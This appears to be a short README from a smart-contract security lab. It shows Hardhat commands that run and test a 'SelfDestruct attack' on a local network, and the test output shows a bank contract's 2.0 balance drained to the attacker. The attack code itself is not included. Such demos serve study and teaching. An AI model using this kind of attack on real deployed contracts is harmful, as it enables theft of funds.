# SelfDestruct Attack

## Script

```bash
$ cd overflow
$ npx hardhat compile
$ npx hardhat run scripts/SelfDestructAttack.js --network localhost
$ npx hardhat test test/SelfDestructAttack.js

  SelfDestruct Attack
Bank balance before attack: 2.0
Attacker balance before attack: 10000.0
-------------------------------
Bank balance after attack-2: 0.0
Attacker balance after attack: 10001.999854172729825825
    ✔ should allow self-destruct attack to drain funds from the bank


  1 passing (582ms)
```